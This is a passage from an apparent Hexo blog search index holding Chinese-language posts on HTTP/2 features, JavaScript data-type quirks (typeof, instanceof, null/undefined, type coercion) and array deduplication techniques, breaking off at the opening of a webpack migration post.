技术栈中引发一系列连锁反应，从而带来巨大的性能提升。 123456* 可以并行交错地发送请求，请求之间互不影响；* 可以并行交错地发送响应，响应之间互不干扰；* 只使用一个连接即可并行发送多个请求和响应；* 消除不必要的延迟，从而减少页面加载的时间；* 不必再为绕过 HTTP 1.x 限制而多做很多工作； HTTP 2.0 的二进制分帧机制解决了 HTTP 1.x 中存在的队首阻塞问题，也消除了并行处理和发送请求及响应时对多个连接的依赖。 请求优先级 把 HTTP 消息分解为很多独立的帧之后，就可以通过优化这些帧的交错和传输顺序，每个流都可以带有一个 31 比特的优先值：0 表示最高优先级；2 的 31 次方 - 1 表示最低优先级。 服务器可以根据流的优先级，控制资源分配（CPU、内存、带宽），而在响应数据准备好之后，优先将最高优先级的帧发送给客户端。 HTTP 2.0 一举解决了所有这些低效的问题：浏览器可以在发现资源时立即分派请求，指定每个流的优先级，让服务器决定最优的响应次序。这样请求就不必排队了，既节省了时间，也最大限度地利用了每个连接。 每个来源一个连接 有了新的分帧机制后，HTTP 2.0 不再依赖多个 TCP 连接去实现多流并行了。每个数据流都拆分成很多帧，而这些帧可以交错，还可以分别优先级。HTTP 2.0 连接都是持久化的，而且客户端与服务器之间也只需要一个连接即可。 实验表明，客户端使用更少的连接肯定可以降低延迟时间。HTTP 2.0 发送的总分组数量比 HTTP 差不多要少 40%。 大多数 HTTP 连接的时间都很短，而且是突发性的，但 TCP 只在长时间连接传输大块数据时效率才最高。HTTP 2.0 通过让所有数据流共用同一个连接，可以更有效地使用 TCP 连接。 流量控制 HTTP 2.0 为数据流和连接的流量控制提供了一个简单的机制： 流量控制基于每一跳进行，而非端到端的控制； 流量控制基于窗口更新帧进行，即接收方广播自己准备接收某个数据流的多少字节，以及对整个连接要接收多少字节； 流量控制窗口大小通过 WINDOW_UPDATE 帧更新，这个字段指定了流 ID 和窗口大小递增值； 流量控制有方向性，即接收方可能根据自己的情况为每个流乃至整个连接设置任意窗口大小； 流量控制可以由接收方禁用，包括针对个别的流和针对整个连接。 服务器推送 HTTP 2.0 新增的一个强大的新功能，就是服务器可以对一个客户端请求发送多个响应。服务器向客户端推送资源无需客户端明确地请求。 HTTP 2.0 连接后，客户端与服务器交换 SETTINGS 帧，借此可以限定双向并发的流的最大数量。因此，客户端可以限定推送流的数量，或者通过把这个值设置为 0 而完全禁用服务器推送。 所有推送的资源都遵守同源策略。换句话说，服务器不能随便将第三方资源推送给客户端，而必须是经过双方确认才行。 PUSH_PROMISE：所有服务器推送流都由 PUSH_PROMISE 发端，服务器向客户端发出的有意推送所述资源的信号。客户端接收到 PUSH_PROMISE 帧之后，可以视自身需求选择拒绝这个流 几点限制： 服务器必须遵循请求 - 响应的循环，只能借着对请求的响应推送资源 PUSH_PROMISE 帧必须在返回响应之前发送，以免客户端出现竞态条件。 首部压缩（HPACK 压缩算法，一边用 index mapping table 压缩，一边编码，这个 table 由静态表和动态表组成） http2.0 会压缩首部元数据：在客户端和服务器端使用 “首部表” 来跟踪和存储之前发送的键值对，对于相同的数据，不再通过每次请求和响应发送；“首部表”在 http2.0 的连接存续期内始终存在，由客户端和服务器共同渐进地更新；每个新的首部键值对要么追加到当前表的末尾，要么替换表中之前的值。 http2.0 首部差异化传输 请求与响应首部的定义在 HTTP2.0 中基本没有改变，只是所有首部键必须全部小写，而且请求行要独立为 :method、:scheme、:host、:path 这些键值对。 有效的 HTTP2.0 升级与发现 大多数现代浏览器都内置有高效的后台升级机制，支持 HTTP2.0 的客户端在发起新请求之前，必须能发现服务器及所有中间设备是否支持 HTTP2.0 协议。有三种可能的情况： 通过 TLS 和 ALPN 发起新的 HTTPS 连接； 根据之前的信息发起新的 HTTP 连接； 没有之前的信息而发起新的 HTTP 连接。 HTTPS 协商过程中有一个环节会使用 ALPN（应用层协议协商）。减少网络延迟是 HTTP 2.0 的关键条件，因此在建立 HTTPS 连接时一定会用到 ALPN 协商。 通过常规非加密信道建立 HTTP2.0 连接需要多做一点工作。因为 HTTP1.0 和 HTTP2.0 都使用同一个端口（80），有没有服务器是否支持 HTTP2.0 的其他任何信息，此时客户端只能使用 HTTP Upgrade 机制通过协调确定适当的协议： 12345Upgrade: HTTP/2.0 ➊HTTP2-Settings: (SETTINGS payload) ➋HTTP/1.1 200 OK ➌HTTP/1.1 101 Switching Protocols ➍... 1234➊ 发起带有 HTTP 2.0 Upgrade 首部的 HTTP 1.1 请求➋ HTTP/2.0 SETTINGS 净荷的 Base64 URL 编码➌ 服务器拒绝升级，通过 HTTP 1.1 返回响应➍ 服务器接受 HTTP 2.0 升级，切换到新分帧","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"HTTP","slug":"HTTP","permalink":"https://hexo.bangz.me/tags/HTTP/"}]},{"title":"细说 javascript 的数据类型","slug":"data-types-designing-of-javascript","date":"2018-06-14T04:00:26.000Z","updated":"2022-01-25T09:32:43.975Z","comments":true,"path":"archives/data-types-designing-of-javascript.html","link":"","permalink":"https://hexo.bangz.me/archives/data-types-designing-of-javascript.html","excerpt":"现在出来写前端有一段时间了，现在来回头看看，当初大学刚学搞前端的时候，为了快速适应新的语言，直接看后面的内容去了，跳过了基本数据类型的介绍，想当然的觉得 javascript 的数据类型应该也跟其他弱类型语言差不了太多，从而忽略了基本数据类型上的细节。最近随着对 js 语言了解和应用的加深，发现 js 的基本数据类型里面真的大有文章，甚至有不少的语言设计缺陷在里面。所以我打算专门写一篇关于基本数据类型的文章，专门来谈谈 js 在基本数据类型上的这些设计和缺陷。","text":"现在出来写前端有一段时间了，现在来回头看看，当初大学刚学搞前端的时候，为了快速适应新的语言，直接看后面的内容去了，跳过了基本数据类型的介绍，想当然的觉得 javascript 的数据类型应该也跟其他弱类型语言差不了太多，从而忽略了基本数据类型上的细节。最近随着对 js 语言了解和应用的加深，发现 js 的基本数据类型里面真的大有文章，甚至有不少的语言设计缺陷在里面。所以我打算专门写一篇关于基本数据类型的文章，专门来谈谈 js 在基本数据类型上的这些设计和缺陷。 1. javascript 的诞生背景要说 javascript 的设计缺陷，我觉得不得不先谈下 js 诞生的背景，据说 javascript 的作者 Brendan Eich 在设计和实现它的时候，总共加起来居然只花了十天的时间。。。 想一想，咱一个项目周期一般都是一个月左右，而这位大佬只花了十天就是设计出了一门语言！也许这就是真大佬的实力吧。。。 有兴趣的可以看下 阮一峰的这篇文章 了解一下。但也就是在这种高压，并要求苛刻的背景下，就算是大佬也无法避免地在语言设计上出现了一些缺陷错误，有些随着时间的推移，想改都已经改不掉了，因为一改就会所有网站的 js 代码都得跟着改，由于当今 web 网站体量极为庞大，这么做会得罪很多人，所以这些缺陷错误都慢慢地成为了历史遗留问题。 作为一个 js 程序员，必须时时刻刻都要清楚牢记这些缺陷，在写代码的时候要尽可能地随时避开这些坑，这样子我们才能写出更加健壮，稳定，不坑自己的代码。 2. 基础数据类型表首先必须要明确的一点是 javascript 这门语言根据 ECMAScript 2015 标准的定义，只有 7 种数据类型，它们分别是： Number Boolean String Symbol（ES2015 中加入） Null Undefined Object 其中原始 (Primitive) 数据类型为 Number, Boolean, String, Symbol, Null, Undefined 而引用 (Reference) 数据类型为 Object 其他什么 Array, Function, RegExp 等的都是 Object 的子类。 3. typeof 操作符上的问题我们先来看一个 ECMAScript 2015 中规范的表格： Table 35 — typeof Operator Results Type of val Result Undefined “undefined” Null “object” Boolean “boolean” Number “number” String “string” Symbol “symbol” Object (ordinary and does not implement [[Call]]) “object” Object (standard exotic and does not implement [[Call]]) “object” Object (implements [[Call]]) “function” Object (non-standard exotic and does not implement [[Call]]) Implementation-defined. Must not be “undefined”, “boolean”, “function”, “number”, “symbol”, or “string”. 这个表格第一眼看过去会发现规范中存在着至少两个问题： 3.1. typeof null 的值为 “object”前面说好的 null 是单独的一种数据类型，为什么 typeof null 又返回了 “object” 呢？？？ 这实在是太奇怪了，网上搜查了一番，看到了这个。原来 typeof null 就是一个设计缺陷，把 null 设计成了 0x00 ，而用 typeof 去判断类型的时候，如果低三位都是 0 就返回 “object”； 000: object. The data is a reference to an object. 这个问题就是前面所说的无法修改的设计缺陷，返回错误也拿它没办法，用户体量实在太庞大了，曾经有提案 typeof null === ‘null’. 但提案被拒绝harmony:typeof_null [ES Wiki] 3.2. 为什么要多出个 “function” 类型出来难道函数也要单独算一种类型？这跟前面基本数据类型的定义又对不上了。 带着这个问题我又去搜了一圈，找到了这篇东西 JavaScript 里 Function 也算一种基本类型？ 如果抛开 typeof null 的谜题，那么剩下唯一不对应的地方，就是 function 被单列出来。我个人的看法，这是因为 function 确实很特殊，特殊到从实际应用场景考虑确实应该将其单独列出来。spec 没有将其单列，是因为它同样有所有其他 object 的特性——而按照我的看法（爱民应该也是这样的看法），这仅仅是因为当初 JS 是如此设计和实现的。如果当初 function 不是作为一种特殊 object 来实现的（这完全是可能的，而且其实这样做更清晰），spec 自然应该将其单列为类型之一。 如果按照这个说法这么一看，\bfunction 就是因为它的特殊性被开了特例，所以 typeof 这个函数也并不是完全按照前面基本数据类型来的，另外规范里面还有一种区分普通对象的 exotic 对象，这种对象可以根据浏览器实现来控制 typeof 的返回值，所以 typeof 现在的返回值也不仅仅只有基本数据类型和 function 了。 作为 typeof 的使用者，对于 typeof 这个操作符还是应该记住这个规律： 对于基本类型，除 null 以外，均可以返回正确的结果。 对于引用类型，除 function 以外，一律返回 object 类型。 对于 null ，返回 object 类型。 对于 function 返回 function 类型。 3.3. “number” 类型中的特殊值对于 NaN 和 Infinity 这两个特殊值，typeof 遇到他们都会返回 number 12typeof Infinity // \"number\"typeof NaN // \"number\" Infinity 其实还好，但是 NaN(Not a Number)把它设计成 number 类型之后，使得有些时候用 typeof 在判断数字的时候不会达到我们想要的效果： 12345var response = &#123;&#125;var num = parseInt(response.a)if (typeof num === 'number') &#123; num = num + 10 // 执行后 num 仍然是 NaN&#125; 服务器下发的数据中，缺少了 response.a 的数值字段，如果没有提前对这个字段是否为空做判断，就会发生上面的情况，它一旦出现，有时候会非常难找原因，因为在编译的时候它也不会报错，开发者不容易发现这个问题。 在这里也顺带说下，\b其实判断一个值是否为数字的最好的办法是借助 isFinite 函数来进行判断，因为 isFinite 函数本身会把传入值转换为 number，所以还得提前再加一层判断：123function isNumber(val) &#123; return typeof val === \"number\" &amp;&amp; isFinite(val)&#125; 4. instanceof 操作符上的问题关于 instanceof 这个操作符，可以在 MDN 上看到它的定义： instanceof 运算符用来测试一个对象在其原型链中是否存在一个构造函数的 prototype 属性。 从这个定义上可以看出，instanceof 操作符相当于在原型链上查找一个 constructor，如果这个 constructor 存在的话，该运算符返回 true， 否则返回 false。 举个例子：12345678function Animal() &#123;&#125;function Dog() &#123;&#125;Dog.prototype = new Animal();Dog.prototype.constructor = Dog;var adog = new Dog();console.log(adog instanceof Dog); // 返回 trueconsole.log(adog instanceof Animal); // 返回 true 平时这样子正常使用它是感觉不出来有问题的，然而，当遇到下面这些情况的时候，就需要注意了。 4.1. 当页面中存在一个或多个 frame 的时候1[] instanceof window.frames[0].Array 这个跨环境的判断会返回 false，因为 Array.prototype !== window.frames[0].Array.prototype 这在跨 frame 传递数据对象的时候，需要注意的一个问题。 4.2. 一些相对特殊的判断123456789101112Object instanceof Object // trueFunction instanceof Function // trueFunction instanceof Object // trueDog instanceof Object // trueDog instanceof Function // trueDog instanceof Dog // falseNumber instanceof Number // falseBoolean instanceof Boolean // falseString instanceof String // falseSymbol instanceof Symbol // false 虽然前面的规范表格里面有提到过，js 里的 Function 是一个实现了 [[call]] 方法的 Object，它具有 Object 对象的全部特性，也就是说，Function 是继承了 Object 对象的，所以 Function instanceof Object 不难理解。 但是 Function instanceof Function 和 Object instanceof Object，实在是比较容易懵，一开始我也没想明白为什么会这样，后来看到了 IBM 上的一篇文章，里面对这个 instanceof 的执行过程做了一个模拟还原： 1234567891011function instance_of(L, R) &#123;//L 表示左表达式，R 表示右表达式 var O = R.prototype;// 取 R 的显示原型 L = L.__proto__;// 取 L 的隐式原型 while (true) &#123; if (L === null) return false; if (O === L)// 这里重点：当 O 严格等于 L 时，返回 true return true; L = L.__proto__; &#125; &#125; 可以看出，instanceof 操作符会在左边的表达式中递归地向上查找 __proto__ 属性值，这个 __proto__ 对应着规范上的 [[Prototype]] 属性，再来对应到我们现在的问题上，最关键的是这一段： 清单 7. Object instanceof Object ... L = ObjectL.__proto__ = Function.prototype 等下，ObjectL.__proto__ 竟然是 Function.prototype ？？？ 看到这里我才突然想起来，原来 Object 和 Function \b他们本身都是作为函数来提供给用户调用的，所以他们必须是 Function，按照这个思路，Object instanceof Object 和 Function instanceof Function 返回 true 也就合情合理了。 而对于 Dog instanceof Dog 为什么返回 false，也是因为 L = FooL.__proto__ = Function.prototype 左侧表达式一开始就为 Function.prototype 了，这样子的话左侧表达式的原型链在向上查找的过程中就找不到 Dog.prototype 了，结果自然返回的是 false。 4.3. 关于原始类型的包装类对于四个原始类型的包装类，Number, Boolean, String, Symbol 返回 false 的原因会有所不同，我们来看下面一个例子： 123var str = \"dog\";console.log(str instanceof String); // falseconsole.log(str.__proto__ === String.prototype); // true 按照这个结果，那前面的说法就不合逻辑了，str.__proto__ 都是 String.prototype，把这个逻辑套到前面的函数里去 1instance_of(str, String); // true 返回的就是 true，但是偏偏实际 instanceof 操作符返回的就是 false，这是为什么呢？ 在翻阅了一轮资料之后，在 StackOverflow 上看到了这么一个答案。 原来，在我们对原始类型变量使用成员访问符 . 的时候，js 会自动调起装箱机制（auto-boxes），临时把原始数据类型通过语言内置的包装类给转换成对应的对象类型，在这个例子中相当于自动做了 new String(str) 这一步\b，所以我们才能在原始类型的变量上访问到 __proto__ 属性。 换句话说，原始数据类型本身是根本没有 __proto__ 这个对象属性的，在直接使用 instanceof 操作符的时候，js 运行环境并不会自动调起装箱过程，原始数据类型也并没有 [[Prototype]] 属性，所以它的返回的是 false，这也导致了 instanceof 操作符有无法用于判断原始数据类型的弊端。 5. 关于 null 和 undefinedjavascript 有个非常独特的设计，就是 null 和 undefined 同时存在于这个语言中，这使得这门语言可以有两种表示空值的方法，这两个空值在使用过程中极其相似，比如12345678910if (!undefined) console.log('undefined is false');// undefined is falseif (!null) console.log('null is false');// null is falseundefined == null// true 上面相等运算符甚至直接返回 true，很多开发者在实际开发中到底选择哪种也是随心所欲，根本没有去在乎过里面的区别，不过热衷于探索的我还是认为需要深究一下，它们之间究竟有什么区别呢？咱还是来看看定义吧。 5.1. 这两者在定义上的区别 null，表示一个 “无” 的对象 undefined，表示一个 “无” 的原始值 typeof 返回值的区别12typeof null //objecttypeof undefined //undefined Number 转换上的区别1234Number(null) // 0+null // 0Number(undefined) // NaN+undefined // NaN 出现时机上的区别123456var name;console.log(name); //undefinedname = 'night';console.log(name); //nightname = null;console.log(name); //null 看完这三个例子，可以得出一些规律： 对于 null： 变量不主动赋值 null 的话是不会出现 null 的 null 在转换为数字的时候会被转换为 0 typeof null 的值返回的是 “object” 对于 undefined： 变量在声明的时候会被默认初始化为 undefined undefined 在转换为数字的时候会被转换为 NaN typeof undefined 会返回的是 “undefined” 5.2. 同时存在的历史原因虽然我们得到了前面的规律，也可以看出来确实存在一些区别，可是这些区别直观的看过去它们实际上都是些无关痛痒的区别。按理说，这门语言其实只要一个空值就行了，两个空值在很多时候都作用重叠了，它为什么要这样子设计呢？ 翻了一圈，看到了阮老师写的一篇 undefined 与 null 的区别，里面提到了 1995 年 JavaScript 诞生时，最初像 Java 一样，只设置了 null 作为表示 “无” 的值。 但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够，有两个原因。 首先，null 像在 Java 里一样，被当成一个对象。但是，JavaScript 的数据类型分成原始类型（primitive）和合成类型（complex）两大类，Brendan Eich 觉得表示 “无” 的值最好不是对象。 其次，JavaScript 的最初版本没有包括错误处理机制，发生数据类型不匹配时，往往是自动转换类型或者默默地失败。Brendan Eich 觉得，如果 null 自动转为 0，很不容易发现错误。 因此，Brendan Eich 又设计了一个 undefined。 可见，undefined 是在 null 之后设计的，设计它的本意是希望能够补全 null 的不足，然而当真正这么实践的时候，却发现两个空值的作用和含义基本一致，当初只需要改进 null 值就好了，根本不需要多设计一个空值出来。 5.3. 二者的缺陷即使 js 发展到了今天，其实不论是 null 还是 undefined，它们二者仍然存在着各自本身的缺陷。 先说下 null 值。前面也提到了，它作为原始数据类型，typeof null 的值返回 “object” 本身就是个巨大的设计缺陷，所以检测 null 值，用 typeof 是检测不出来的，一般建议下面这种方法： 123function isNull(val) &#123; return val === null;&#125; 而检测对象的值，用 typeof 也没办法区分出 null 和真正的对象，所以要区分出真正的对象，还得用这种方法： 123function isEntityObject(val) &#123; return val &amp;&amp; typeof val === \"object\";&#125; 再来看看 undefined 值的问题，undefined 按理说也应该是一个原始类型的值，然而如果你接触 js 不深的话，你一定做梦也想不到 undefined 竟然是一个全局变量！1window.hasOwnProperty(\"undefined\") // true 因为它既不是 js 里的关键字也不是保留字，可以在 规范 里面看到，undefined 即不存在于关键字列表中，也不存在于保留字列表中，所以它理论上就是一个变量，是可以被任意修改覆盖的。比如 12var undefined = \"oops\";alert(undefined); 据说这段代码在 IE9 以下真的会弹出 oops，有兴趣的可以试一下，不过现在的浏览器\b已经锁定了全局 undefined 的值，上面的操作已经不能够修改 undefined 的值了，但是这段代码这么执行也并不会报错，相比 null，给它赋值就会报错。 12var null = 1;VM122:1 Uncaught SyntaxError: Unexpected token null 然而，它也仅仅只是锁定了全局 undefined 的值，如果在局部声明一个 undefined 变量，它还是可以进行修改 12345!function() &#123; var undefined = \"changed value\"; console.log(undefined);&#125;();// changed value 所以，要想获得唯一准确的 undefined 值，而不是想借用 undefined 变量的话，得走一条弯路：去构造一个 undefined 值，这时候，js 的一个老古董 void 关键字就派上用场了。 5.4. 巧用 void 关键字对于这个关键字，其实我们并不陌生，我们以前经常会见到 javascript:void(0); 这种用法，它与 &lt;a href=&quot;#&quot;&gt;link&lt;/a&gt; 的区别是后者在点击了之后会跳到页面的最顶\b部去，改成用 &lt;a href=&quot;javascript:void(0);&quot;&gt;link&lt;/a&gt; 就可以避免这个问题。 说到底其实 void 这个关键字，它本身的作用只有一个，就是返回一个 undefined 值，它是一个一元操作符，无论后面传入什么参数进去，他都会返回 undefined，比如： 1234567void 0;void \"you are useless?\";void false;void [];void /(useless)/ig;void function()&#123; console.log(\"you are so useless?\"); &#125;//... always return undefined 所以当我们需要使用真正的 undefined 值，而不是全局的 undefined 变量的时候，可以通过 void 关键字去生成一个出来，比如1var scheduleFlush = void 0; 6. 利用 [[Class]] 精确判断数据类型看过了前面 typeof 让人失望的表现之后，再来看看我们到底应该如何稳妥的判断数据类型，目前来说，要检测基本数据类型和内置对象，最好的方法是使用 toString 函数来进行判断。 toString 函数是 Object.prototype 上的方法，所以所有对象都拥有 toString 方法，它可以返回对象内部属性 [[Class]] 的值。但 Array, Date 等对象会重写从 Object.prototype 继承来的 toString 方法，从而返回不同的对象值，下面是一些例子： 12345678910111213141516171819toString.call(&#123;&#125;); // \"[object Object]\"toString.call(function() &#123;&#125;); // \"[object Function]\"toString.call([]); // \"[object Array]\"toString.call(/a/); // \"[object RegExp]\"toString.call(JSON); // \"[object JSON]\"toString.call(new Date()); // \"[object Date]\"toString.call(0); // \"[object Number]\"toString.call(false); // \"[object Boolean]\"toString.call('foo'); // \"[object String]\"toString.call(Symbol()); // \"[object Symbol]\"toString.call(NaN); // \"[object Number]\"toString.call(Infinity); // \"[object Number]\"// Since ECMAScript 5 （JavaScript 1.8.5）toString.call(null); // \"[object Null]\"toString.call(undefined); // \"[object Undefined]\" 可见 toString 函数几乎所有的内置类型都可以返回预期的正确结果，而且由于返回值是字符串，也可以用于解决前面所提到的跨 frame 判断数据类型的问题\b，这几乎是最理想的判断数据类型的方法了。 不过这里值得一提的是，基本数据类型 number, boolean, string, symbol 在调用 toString 这个函数的时候，也是用了包装类来进行隐式自动装箱的，所以它们返回的是首字母大写的 Number, Boolean, String, Symbol。 而对于 null 和 undefined，却不存在 Null 和 Undefined 这两个包装类，根据 ES2015 规范中对于 toString 函数的定义 1. If the this value is undefined, return &quot;[object Undefined]&quot;. 2. If the this value is null, return &quot;[object Null]&quot;. ... 可知，它们是在函数判断的时候直接返回的。也就是说，null 和 undefined 这两个值在 toString 函数处理的时候不需要经过装箱处理，内部代码在直接判断的过程中就进行了返回。 toString 也不是完美的，它无法检测用户自定义类型。 因为 Object.prototype 是不知道用户会创造什么类型的， 它只能检测 ECMA 标准中的那些内置类型。 1toString.call(new Dog()) // [object Object] 所以如果你要判断的是基本数据类型或 JavaScript 内置对象，推荐使用 toString，如果要判断的时自定义对象类型，还是得使用 instanceof 操作符。 7. 弱相等运算符在判断时的类型转换说到这个，不得不提一个经典的例子 1[]==![] // true 这个例子按照常识，右边的 [] 是 Object 类型，在 ! 运算符取反后应该等于 false，而左边的 [] 是 Object，所有的 Object 应该都会被转成 true，所以 true == false 返回的应该是 false 才对，但是怎么就偏偏返回了个 true 呢？ 说到底，还是对这个运算符的了解不够深造成的，对 == 运算符运算过程的理解太想当然了，其实这个运算符真正的内部执行过程是这样的： [] == ![] ==&gt; [] == false ==&gt; [] == ToNumber(false) ==&gt; [] == 0 ==&gt; ToPrimitive([]) == 0 ==&gt; &quot;&quot; == 0 ==&gt; ToNumber(&quot;&quot;) == 0 ==&gt; 0 == 0 ==&gt; true 至于到底为什么\b会这样子算，可以详细看看这篇文章，简单来说就是根据 ECMA 规范的定义，这个运算符会在内部不断的做类型转换。它的转换规则是这样的： null == undefined 为 true，且它俩与所有其他值比较的结果都是 false。 Object 类型在与 Boolean/String/Number 进行运算时，会先调用 ToPrimitive 函数转换为原始类型（内部会尝试调用 valueOf() 方法，如果得到的结果不是基本数据类型，那再调用 toString() 方法） String 类型与 Boolean 类型进行运算时，两边都会先调用 ToNumber 函数转换为 Number 类型 Number 与 String/Boolean 类型进行运算时，String/Boolean 类型的一方会先调用 ToNumber 函数转换为 Number 类型 数值 NaN 与任何值都不相等，包括 NaN 本身也不相等（IEEE-754 浮点数标准定义的） 通过这个转换规则就可以很容易解释前面为什么 [] == ![] 的结果为 true 了 8. 加法运算符在运算时的类型转换这个也是前端的面试中经常会遇到的问题，下面列出几个例子和输出的结果 1231 + \"2\" // \"12\"1 - \"2\" // -1[1, 2] + [3, 4] // \"1,23,4\" 可以发现跟前面 == 号在类型转换的时候，流程是不一样的，可以看到 1 + &quot;2&quot; 在运算的过程中，并不是字符串 “2” 转换成了数字 2，而是 1 变成了字符串 “1” 翻了一圈，发现转换规则是这样的： 将 A 和 B 都转换为原始值(primitive，执行 ToPrimitive)，这里记为 A1，B1 如果 A1 和 B1 中有一个值为 string，则将 A1、B1 都转换为 string（执行 ToString），其值记为 A2、B2，将 A2 B2 连接后就是 A+B 的结果 否则的话将 A1、B1 都转换为 number（执行 ToNumber），其值记为 A3、B3，将 A3 B3 相加即为 A+B 的结果 在这里最重要的是第二点，string 类型的判断会优先于 number，加法运算两边的操作数任意一个为 string，整个结果就应该为 string 类型的！","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"ECMAScript","slug":"ECMAScript","permalink":"https://hexo.bangz.me/tags/ECMAScript/"}]},{"title":"从数组去重来看 javascript 的进化","slug":"373","date":"2017-04-07T01:44:00.000Z","updated":"2018-06-08T09:50:32.000Z","comments":true,"path":"archives/find-javascript-improvements-from-remove-duplicates.html","link":"","permalink":"https://hexo.bangz.me/archives/find-javascript-improvements-from-remove-duplicates.html","excerpt":"说到 javascript 数据去重，估计所有做前端的都并不陌生数组去重的算法即使在实际生产中不一定用的多，但是在面试中几乎成为了必考的题目这是一个神奇的题目，看上去好像是死的，应该已经没有什么发挥空间了但事实上它随着 ECMAScript 标准的发展，数据去重的实现反倒是在不断变化许多公司甚至可以单从一个数组去重直接看出一个前端工程师的大致水平今天我也来说说我所知道的 javascript 数组去重吧","text":"说到 javascript 数据去重，估计所有做前端的都并不陌生数组去重的算法即使在实际生产中不一定用的多，但是在面试中几乎成为了必考的题目这是一个神奇的题目，看上去好像是死的，应该已经没有什么发挥空间了但事实上它随着 ECMAScript 标准的发展，数据去重的实现反倒是在不断变化许多公司甚至可以单从一个数组去重直接看出一个前端工程师的大致水平今天我也来说说我所知道的 javascript 数组去重吧 一、最传统的实现方式123456789101112131415161718var array = [1, 0, 1, NaN, '1', '', true, false, true];var result = [];var i, j;var flag;for (i = 0; i &lt; array.length; i++) &#123; flag = true; for (j = 0; j &lt; result.length; j++) &#123; if (array[i] === result[j]) &#123; flag = false; break; &#125; &#125; if (flag) &#123; result.push(array[i]); &#125;&#125;console.log(result);// 输出结果：[1, 0, NaN,\"1\",\"\", true, false] 这种写法在 ECMAScript 3 的标准（也就是 ECMA-262 第 3 版）下，还可以稍微缩写一下123456789101112var array = [1, 0, 1, NaN, '1', '', true, false, true];Array.prototype.uniq = function() &#123; var result = []; for (var i = 0; i &lt; this.length; i++) &#123; if (result.indexOf(this[i]) === -1) &#123; result.push(this[i]); &#125; &#125; return result;&#125;console.log(array.uniq());// 输出结果：[1, 0, NaN,\"1\",\"\", true, false] 这就是我所说的最传统的方式，几乎所有学过编程的都能想得到，逻辑简单粗暴，而且大多数情况下都管用 二、借助 javascript 对象的特性来构造 hash 表实现去重上面最传统的写法，我说大多数情况下管用，没有说绝对好用，事实上是因为它确实有缺陷比如当数组中存在多个 NaN 时：1var array = [1, 0, 1, NaN, &apos;1&apos;, &apos;&apos;, true, false, true, NaN]; 上面的第一种方法就会返回以下结果：1[1, 0, NaN, &quot;1&quot;, &quot;&quot;, true, false, NaN] 可见，第一种方法无法去掉 NaN 的重复，所以后来有人就想到了第二种方法借助 javascript 对象天然的 hash 特性来去除数组中重复的值12345678910111213var array = [1, 0, 1, NaN, '1', '', true, false, true, NaN];Array.prototype.uniq = function() &#123; var result = [], map = &#123;&#125;; for (var i = 0; i &lt; this.length; i++) &#123; map[this[i]] = this[i]; &#125; for (var key in map) &#123; result.push(map[key]); &#125; return result;&#125;console.log(array.uniq());// 输出结果 [0,\"1\", NaN,\"\", true, false] 去重成功，说明这种方法是可行的，而且这样子去重的速度比前面第一种方式要快得多，因为只有一层循环，所以时间复杂度为 O(n)相比前面的两层循环（时间复杂度为Ο(n2)），确实有了质的提升。不过输出结果似乎跟前面相比，除了 NaN 去掉了之外，数字 1 和字符串 1 也被当成重复的给去掉了所以使用这种方法去重的时候，需要注意这种方法跟前面的去重方式相比，有一种本质性的不同前面的去重是用三个等号判断的，也就是强类型去重，而这种使用 hash 表的去重方法，其实是借助转换成字符串的方式去重这种借助 hash 表中的 key（字符串类型）的去重方式，不属于强类型去重，也不属于弱类型去重（因为 NaN == NaN 不成立），它应该属于一种独特的去重方式往往我们对这种去重方式还是不满意，因为它把数字 1 和字符串 1 也给合并了，我们可以稍微修改一下，在 key 里面同时加上类型：12345678910111213var array = [1, 0, 1, NaN, '1', '', true, false, true, NaN];Array.prototype.uniq = function() &#123; var result = [], map = &#123;&#125;; for (var i = 0; i &lt; this.length; i++) &#123; map[typeof this[i] + this[i]] = this[i]; &#125; for (var key in map) &#123; result.push(map[key]); &#125; return result;&#125;console.log(array.uniq());// 输出结果 [1, 0, NaN,\"1\",\"\", true, false] 这样子基本上就算是实现了我们预期的目标了，同时支持了去除 NaN 的功能 三、借助 ECMAScript 5 的新特性进行简写上面的写法在发展到 ES5 以后有了更简便的写法，可以借助过滤函数 filter 进行优化：12345678910var array = [1, 0, 1, NaN, '1', '', true, false, true, NaN];Array.prototype.uniq = function() &#123; var map = &#123;&#125;; return this.filter(function(item) &#123; var key = typeof item + item; return map.hasOwnProperty(key) ? false : (map[key] = true); &#125;)&#125;console.log(array.uniq());// 输出结果 [1, 0, NaN,\"1\",\"\", true, false] 四、借助 ECMAScript 6 的新特性进行简写到了 ES6 还有更简便的写法，第一种是借助 Map 对象和箭头函数语法糖：1234567var array = [1, 0, 1, NaN, '1', '', true, false, true, NaN];Array.prototype.uniq = function() &#123; const seen = new Map(); return this.filter(a =&gt; !seen.has(a) &amp;&amp; seen.set(a, true))&#125;console.log(array.uniq());// 输出结果 [1, 0, NaN,\"1\",\"\", true, false] 第二种是直接借助 Set：123456var array = [1, 0, 1, NaN, '1', '', true, false, true, NaN];Array.prototype.uniq = function() &#123; return Array.from(new Set(this));&#125;console.log(array.uniq());// 输出结果 [1, 0, NaN,\"1\",\"\", true, false] 可见，发展到 ES6 之后，已经可以一行就实现数组去重了不由得感叹一下，标准的发展使得生产真是越来越便利了！ 参考资料： Remove Duplicates from JavaScript Array求一个 javascript 数组去重方法？也谈 JavaScript 数组去重JavaScript 数组去重","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"}]},{"title":"从 webpack 1 到 webpack 2 的迁移记","slug":"369","date":"2017-02-14T00:42:00.000Z","updated":"2018-06-08T09:49:37.000Z","comments":true,"path":"archives/migrating-config-to-webpack-2.html","link":"","permalink":"https://hexo.bangz.me/archives/migrating-config-to-webpack-2.html","excerpt":"最近上手新项目的时候想要用个 sass，结果发现 npm 里面的 sass-loader 默认的 peerDependencies 中的 webpack 版本被升级到了 2当时没想太多，就装了个 webpack 2.2.1 来用，结果发现以前项目的 webpack 配置居然不能够直接用！一跑起来一还堆错上网查了下，才知道 webpack 2 弄了很多 